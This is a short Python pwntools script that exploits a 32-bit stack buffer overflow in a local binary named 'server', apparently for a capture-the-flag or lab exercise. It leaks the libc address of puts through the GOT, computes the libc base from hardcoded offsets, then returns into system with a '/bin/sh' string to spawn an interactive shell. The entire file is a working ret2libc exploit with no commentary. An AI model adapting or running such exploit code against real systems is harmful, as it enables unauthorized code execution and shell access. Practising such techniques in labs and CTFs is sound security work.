from pwn import *
import time

pwn = process("./server")
gdb.attach(pwn,'''
	b* vuln
	''')
libc = ELF("/lib32/libc.so.6")
elf = ELF("server")

plt_puts = elf.symbols['puts']
vuln = elf.symbols['vuln']
got_puts = elf.got['puts']
junk = b'\x41' * 0x3c

puts_offset = 0x5f140
system_offset = 0x3a940
binsh_offset = 0x15902b

buf = junk
buf += p32(plt_puts)
buf += p32(vuln)
buf += p32(got_puts)

pwn.sendline(buf)

print(pwn.recvuntil("Return address:").decode())
print(pwn.recvline().decode())

print(pwn.recvuntil("Return address:").decode())
print(pwn.recvline().decode())
pwn.recvline()
libc_puts = u32(pwn.recvline()[0:4])
print("[>] libc puts address: {}".format(hex(libc_puts)))

libc_base = libc_puts - puts_offset
print("[>] libc base address: {}".format(hex(libc_base)))

libc_system = libc_base + system_offset
libc_binsh = libc_base + binsh_offset 

buf2 = b'A' * 0x3c
buf2 += p32(libc_system)
buf2 += b'\x42\x42\x42\x42'
buf2 += p32(libc_binsh)

pwn.sendline(buf2)
pwn.interactive()
